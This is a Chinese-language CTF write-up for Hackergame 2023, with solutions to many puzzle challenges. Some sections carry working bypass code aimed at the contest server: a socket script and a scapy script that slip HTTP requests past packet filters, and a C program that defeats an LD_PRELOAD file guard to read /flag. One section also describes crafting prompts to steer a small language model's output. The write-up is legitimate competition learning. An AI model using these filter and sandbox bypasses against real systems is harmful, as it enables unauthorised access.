---
title: "HackerGame2023 WriteUP"
date: 2023-11-05T19:45:29+08:00
toc: true
math: md
tags: ["题解", "CTF"]
cover: https://s2.loli.net/2023/11/05/HETxNBMAXsLzwop.jpg
grow: mid
---

## 奶奶的睡前 flag 故事

题目中提到 **谷歌的『亲儿子』** **连系统都没心思升级** 推测可能是 pixel 老系统的一个 bug。

搜索一圈，搜到 Windows 11 同样有这个 bug ，屏幕截图后剪切其中一部分，被剪切的数据仍保存在文件中，位于 IEND 标签后。

使用 010 Editor 检查，发现图片 IEND 后仍有大量 IDAT 和一个 IEND，符合 aCropalypse 漏洞，在 [acropalypse.app](https://acropalypse.app/) 上恢复即可 。

## 组委会模拟器

直接写个脚本跑就完了

```js
(function() {
    'use strict';
    setTimeout(()=>{
        var container = document.getElementsByClassName('fakeqq-container')[0];
        container.addEventListener('DOMSubtreeModified', function (e) {
            var bubble = e.target.children[e.target.children.length - 1].children[0].children[1].children[1];
            var txt = bubble.children[1].innerHTML;
            var re = /hack\[[a-z]+\]/;
            var pos = txt.search(re);
            if (pos >= 0)
            {
                const event = new MouseEvent('click', {
                    view: window,
                    bubbles: true,
                    cancelable: true
                });
                bubble.dispatchEvent(event);
            }
        }, false);
    }, 500);
})();
```

## 虫

写完签到题就过来写这个题了，喜提一血奖。

搜索 ISS 可知题目音频是一段 SSTV 信号，下载 RX-SSTV 解码即可。

## JSON ⊂ YAML?

先随机试了一下相同键名，拿到 flag2。

接着开始搜索，找到这个帖子 [what-valid-json-files-are-not-valid-yaml-1-1-files(stackoverflow)](https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files)，

```json
{ "123": 6, "123": 12345e999 }
```

## Git? Git!

`git log` 检查发现存在一次 `reset` 记录，再次使用 `git reset` 回退，检查 `README.md` 得到 flag。

## HTTP 集邮册

本来没冲着一血来的，结果莫名其妙一血了。

没什么好说的，照着 [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) 一个一个试就行了。

## Docker for Everyone

试图给我那 C 盘通红的 Windows 安装 Docker，结果大失败，这个题放了好久都没写。

后来看写出来的人那么多，就直接在网页终端上试着写了。

直接打开 flag 是不行的，没有权限。试着用 docker 把 flag 坐在文件夹挂载到容器内，发现可以直接打开，获得 flag。

## 惜字如金 2.0

去年的惜字如金完全看不懂，于是今年看到这个题，又看到一个 math 标签，直接就准备跳过了。

结果把程序下载下来发现意外地很简单，`cod_dict` 一共有 5 行，每一行都缺少一个字符。

根据索引表，在 `cod_dict` 找前 5 个字符和最后一个字符，保证它们分别为 `flag{` 和 `}` 。

在保证这一条件的基础上，发现还未确定哪个字符被惜字如金化的行对最终结果无影响，直接在任意能够保证前置条件的位置加上任意字符即可。

## 🪐 高频率星球

Windows 下装不了 asciinema ，跑去 vlab 装了一个，直接 `asciinema cat` 输出到文件，删除一些杂七杂八的代码得到一段 js 代码，执行即可。

## 🪐 小型大语言模型星球

第一题，调教之后发现输入 `Is I smart?` 即可。

第二题，下载 TinyStories-33M 的训练数据，在里面搜索 `accepted` ，并把该单词前的一个单词作为 prompt，发现 任意主语 + `gratefully` 都能触发 `accepted`，但太长了，不可取。

于是写了个程序获取训练集中所有的 `accepted` 前的单词，将其作为 prompt，找到答案 `atively` 。

## 🪐 流式星球

010 Editor 打开 bin 文件，发现其中有很多重复的 `06 08 0A` 

![20231105_1.png](https://s2.loli.net/2023/11/05/NELY8IrUHlSev1h.png)

推测重复部分是因为上下两行颜色相同。找到和图中格式相同的另一段数据，起始位置为 `0x0501` ，故推测每一行像素个数为 `427` 。

整个文件有 `0x80E2CBF` 个字节，相比完整片段少了不到 `100` 个字节，按行取模补充完整，可知一共有 `105501` 行。

将其分解，一个一个试，可得到正确的分辨率 `427 x 759`。

还原代码

```py
def numpy_array_to_video(numpy_array, video_out_path):
    numpy_array = np.array(numpy_array, dtype=np.uint8)
    video_height = numpy_array.shape[1]
    video_width = numpy_array.shape[2]

    out_video_size = (video_width, video_height)
    output_video_fourcc = int(cv2.VideoWriter_fourcc(*'mp4v'))
    video_write_capture = cv2.VideoWriter(video_out_path, output_video_fourcc, 30, out_video_size)

    for frame in numpy_array:
        video_write_capture.write(frame)

    video_write_capture.release()
```

## 🪐 低带宽星球

第一题随便找个在线压缩网站压一下就行。

为了写第二题，钻研了两天 PNG 文件格式。托这道题的福，让我成功发现了“奶奶的睡前 flag 故事”题目图片中出现了多余的 IDAT 块和 IEND 块。

尝试了把图像位宽压缩到 2 bit，使用 PLTE 块索引颜色，IDAT 块内每一行都使用左过滤（或第一行左过滤，后续均使用上过滤）。

但得到的图像尾部始终有大量的 `00` 字节，将其删除会导致图像下方若干行消失。

使用 png 压图始终不能将图片压缩到 1.21 KB 以下，遂放弃。

## Komm, süsser Flagge

看到题的第一反应：把 HTTP 请求拆成两个包，一个包发送 `P` ，另一个包发送 `OST` 及后续即可。

```py
import socket

host = '202.38.93.111'
port = 18082

request = b"""POST / HTTP/1.1
Host: 202.38.93.111:18082
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

149:u149="""
print(request)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.send(request)

    response = s.recv(4096)
    print(response.decode())

```

结果发现第二题也能过，后来了解到是题目出的有问题。

第三题，只允许前 50 个字节包含 `GET / HTTP` 的 TCP 包通过，自然考虑到在 TCP 包的 Header 里塞入这个字符串。

于是在研究了一晚上手搓协议栈之后选择了放弃，不过第二天突然发现有个好用的库叫做 `scapy`，直接找了份现成的代码做了小修改。

```py
# ref: https://blog.csdn.net/qq_43402663/article/details/122755489
from scapy.all import *

from scapy.layers.http import HTTP
from scapy.layers.inet import IP, TCP, IPOption
from scapy.layers.l2 import Ether

payload = "hello"

dst_ip = "202.38.93.111"
dst_port = 18082
src_port = 20001
data = b"""POST / HTTP/1.1
Host: 202.38.93.111:18082
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

149:u149=""".decode('utf-8')

try:
    spk1 = IP(dst=dst_ip, options=IPOption(b'\x21\x0CGET / HTTP')) / TCP(dport=dst_port, sport=src_port, flags="S")
    res1 = sr1(spk1)
    print(res1)
    ack1 = res1[TCP].ack
    ack2 = res1[TCP].seq + 1
    spk2 = IP(dst=dst_ip, options=IPOption(b'\x21\x0CGET / HTTP')) / TCP(dport=dst_port, sport=src_port, seq=ack1, ack=ack2, falgs="A")
    send(spk2)
except Exception as e:
    print(e)
da1 = IP(dst=dst_ip, options=IPOption(b'\x21\x0CGET / HTTP')) / TCP(dport=dst_port, sport=src_port, seq=ack1, ack=ack2, flags=24) / data
res2 = sr1(da1)

# flag{1p_OoOpt10ns_c0fa9b7b01}
```

## 为什么要打开 /flag 😡

第一题，`LD_PRELOAD` 导致 `open` 等函数变成了被指定的库中的函数。

搜了大半天没找到怎么绕过 `LD_PRELOAD` （不过官方题解说只要静态编译就好了）。

于是看了看提供的被修改的库，发现 `isflag` 函数调用了 `strstr` ，而 `strstr` 没有在该库中被定义。

抱着随便试一试的心态，自己定义了 `strstr` 这个函数，使其始终返回 `NULL` ，结果就过了。

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

char s[50] = {};

char* strstr(const char *a, const char *b)
{
    return NULL;
}

int main()
{
    int f = open("./flag", O_RDONLY);
    read(f, s, sizeof(s));
    printf("%s", s);
    return 0;
}
```

第二题，根据代码中给出的提示

```rust
// This source code modifies code from [greenhook crate](https://crates.io/crates/greenhook).
```

一路搜寻，发现这是 taoky 写的库，是 taoky 出的题，并且得知需要使用 TOCTOU 攻击。

然而努力了一天修改系统调用的寄存器之后发现 ptrace 被禁用，遂不知道如何解题，放弃。

## 异星歧途

感觉挺像异星工场，好像还有一个游戏叫异形工厂，也和它挺像的。

异星歧途是 mindastry，异星工场是 factorio，异形工厂是 shape.z

这些游戏中文名都挺像的，英文名起名风格也都一样，都是一个符合游戏主题的单词加一个字母。

## 小 Z 的谜题

题目代码中写道 `constraints` ，题目又是小 Z。很难不让人想到 Z3 Solver。

`stage 0 & 1` 不用考虑，`stage 2` 要求了一个奇怪的顺序，`stage 3` 要求满足若干个约束。

直接上 Z3 求解，不需要知道为什么。

```py
from z3 import Int, And, Or, solve, PbEq, PbGe, PbLe, Solver, Not, Distinct, sat
import itertools
import time


def print_solver(ss):
    m = ss.model()

    numbers = [[[0 for i in range(2)] for j in range(3)] for k in range(16)]

    for i in range(16):
        for j in range(3):
            for k in range(2):
                numbers[i][j][k] = m.eval(arrange[i][j][k]).as_long()

    numbers = sorted(numbers)

    st = ''

    for i in range(16):
        for j in range(3):
            for k in range(2):
                st += (chr(ord('0') + numbers[i][j][k]))

    return st


arrange = [[[Int(f'A_{i}_{j}_{k}') for k in range(2)] for j in range(3)] for i in range(16)]

stage_1 = [And(arrange[i][j][k] >= 0, arrange[i][j][k] <= 5) for k in range(2) for j in range(3) for i in range(16)]

constraints = (
    (1, 1, 3),
    (1, 2, 2),
    (1, 2, 4),
    (1, 4, 4),
    (2, 2, 2),
    (2, 2, 3)
)

count = [3, 4, 2, 2, 2, 3]

stage_2 = []

for i in range(16):
    for j in range(i + 1, 16):
        stage_2.append(Or(
            arrange[i][0][1] <= arrange[j][0][0], arrange[j][0][1] <= arrange[i][0][0],
            arrange[i][1][1] <= arrange[j][1][0], arrange[j][1][1] <= arrange[i][1][0],
            arrange[i][2][1] <= arrange[j][2][0], arrange[j][2][1] <= arrange[i][2][0]
        ))

stage_3_tmp = [[] for _ in range(6)]

for i in range(16):
    stage_3_tmp[0].append(Or(
        And(arrange[i][0][1] - arrange[i][0][0] == 1,
            arrange[i][1][1] - arrange[i][1][0] == 1,
            arrange[i][2][1] - arrange[i][2][0] == 3),

        And(arrange[i][0][1] - arrange[i][0][0] == 1,
            arrange[i][1][1] - arrange[i][1][0] == 3,
            arrange[i][2][1] - arrange[i][2][0] == 1),

        And(arrange[i][0][1] - arrange[i][0][0] == 3,
            arrange[i][1][1] - arrange[i][1][0] == 1,
            arrange[i][2][1] - arrange[i][2][0] == 1),
    ))

    stage_3_tmp[1].append(Or(
        And(arrange[i][0][1] - arrange[i][0][0] == 1,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 2),

        And(arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 1),

        And(arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 1,
            arrange[i][2][1] - arrange[i][2][0] == 2),
    ))

    stage_3_tmp[2].append(Or(
        And(arrange[i][0][1] - arrange[i][0][0] == 1,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 4),

        And(arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 1,
            arrange[i][2][1] - arrange[i][2][0] == 4),

        And(arrange[i][0][1] - arrange[i][0][0] == 4,
            arrange[i][1][1] - arrange[i][1][0] == 1,
            arrange[i][2][1] - arrange[i][2][0] == 2),

        And(arrange[i][0][1] - arrange[i][0][0] == 1,
            arrange[i][1][1] - arrange[i][1][0] == 4,
            arrange[i][2][1] - arrange[i][2][0] == 2),

        And(arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 4,
            arrange[i][2][1] - arrange[i][2][0] == 1),

        And(arrange[i][0][1] - arrange[i][0][0] == 4,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 1),
    ))

    stage_3_tmp[3].append(Or(
        And(arrange[i][0][1] - arrange[i][0][0] == 1,
            arrange[i][1][1] - arrange[i][1][0] == 4,
            arrange[i][2][1] - arrange[i][2][0] == 4),

        And(arrange[i][0][1] - arrange[i][0][0] == 4,
            arrange[i][1][1] - arrange[i][1][0] == 4,
            arrange[i][2][1] - arrange[i][2][0] == 1),

        And(arrange[i][0][1] - arrange[i][0][0] == 4,
            arrange[i][1][1] - arrange[i][1][0] == 1,
            arrange[i][2][1] - arrange[i][2][0] == 4),
    ))

    stage_3_tmp[4].append(And(
            arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 2
    ))

    stage_3_tmp[5].append(Or(
        And(arrange[i][0][1] - arrange[i][0][0] == 3,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 2),

        And(arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 2,
            arrange[i][2][1] - arrange[i][2][0] == 3),

        And(arrange[i][0][1] - arrange[i][0][0] == 2,
            arrange[i][1][1] - arrange[i][1][0] == 3,
            arrange[i][2][1] - arrange[i][2][0] == 2),
    ))

stage_3 = []

for i in range(len(count)):
    stage_3.append(
        PbEq([(x, 1) for x in stage_3_tmp[i]], count[i])
    )

# for 157
stage_5 = [
    Distinct(arrange[1][0][0], arrange[2][0][0], arrange[3][0][0], arrange[4][0][0], arrange[0][0][0]),
    Distinct(arrange[5][1][0], arrange[6][1][0], arrange[7][1][0], arrange[8][1][0], arrange[9][1][0]),
    Distinct(arrange[10][2][1], arrange[11][2][1], arrange[12][2][1], arrange[13][2][1], arrange[14][2][1])
]


def checker(inp):
    aa = [[[0 for i in range(3)] for j in range(3)] for k in range(16)]
    s = (c for c in inp.strip())
    for i in range(16):
        for j in range(3):
            for k in range(3):
                if k == 2:
                    aa[i][j][k] = -1
                else:
                    aa[i][j][k] = int(next(s))

    score = len(set((x, y, z) for i in range(16) for x, y, z in itertools.product(*aa[i])))
    print(inp, " : ", score)


while True:
    sss = Solver()
    sss.add(stage_1 + stage_2 + stage_3 + stage_5)
    sss.check()
    checker(print_solver(ss=sss))

# 136: 022424030202030224032402034501040445044515232424340224343414350202352304353501450224450345453515
# 157: 013535014503020135021335022402030202040423143434153545154504240335252402350201350212450345450424
#      010235020313022535023513034501040401120235231515240115341412351324351345353525354502450125450402

```

136 的情况随便跑跑就出来了，157 比较难出，于是额外加了一些意识流约束，要求元素尽可能不相同以得到更高的分数。

## 后记

连着打了三年，从 33 名到 17 名，再到今年第 5 名，拿到了二等奖，也算是不给大学生活留下遗憾了。明年要是再打，就不再是以校内选手的身份参与了。

![20231105_2.jpg](https://s2.loli.net/2023/11/06/sAcS2fEauwqx4WH.jpg)

![20231105_3.jpg](https://s2.loli.net/2023/11/06/6EDkSr1mBzpY9bc.jpg)